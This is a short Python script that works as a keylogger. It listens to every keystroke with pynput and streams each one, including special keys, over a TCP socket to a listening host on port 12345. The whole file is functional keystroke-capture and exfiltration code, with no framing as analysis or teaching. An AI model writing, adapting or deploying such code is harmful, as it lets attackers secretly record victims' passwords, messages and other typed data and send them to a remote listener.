import os
import socket
from pynput.keyboard import Key, Listener

# Create Socket and Connect to Host
host = socket.gethostname()
port = 12345
s = socket.socket()		# TCP socket object
s.connect((host,port))

# Keylog 
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:  # Check if the key has a printable representation
            key_data = key.char
        elif key == Key.space:
            key_data = " "
        else:
            key_data = f"{key}"  # For special keys like 'Key.shift'
        s.sendall(key_data.encode('utf-8'))  # Encode to bytes and send
    except Exception as e:
        print(f"An error occurred: {e}")

with Listener(on_press=on_press) as listener :
    listener.join() 